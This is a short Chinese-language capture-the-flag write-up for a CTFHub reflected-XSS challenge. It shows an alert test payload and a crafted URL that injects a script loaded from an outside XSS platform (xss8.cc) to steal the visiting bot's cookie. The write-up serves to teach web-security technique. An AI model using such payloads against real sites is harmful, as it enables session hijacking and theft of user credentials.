# CTFHUB_xss

## 题目内容

![image-20210824222657728](/home/adian/note/Study_Note/网络安全/CTF/pic/23.png)


## WriteUp

第一栏有一个反射型xss，通用语法即可成功弹窗

```
<script>alert('222')</script>
```

但是这和flag没关系

所以flag一定在send url处,点击send只会提示successful，但是既然有bot,那就说明会点击链接

使用xss平台即可打到cookie

```
http://challenge-f646219db9de580d.sandbox.ctfhub.com:10800/?name=123<sCRiPt sRC=//xss8.cc/Kb7u></sCrIpT>
```

我对这个感觉有些奇怪，因为我以为bot本身就是平台，所以可以直接打进去XSS语句，没想到要利用url的这个反射型XSS

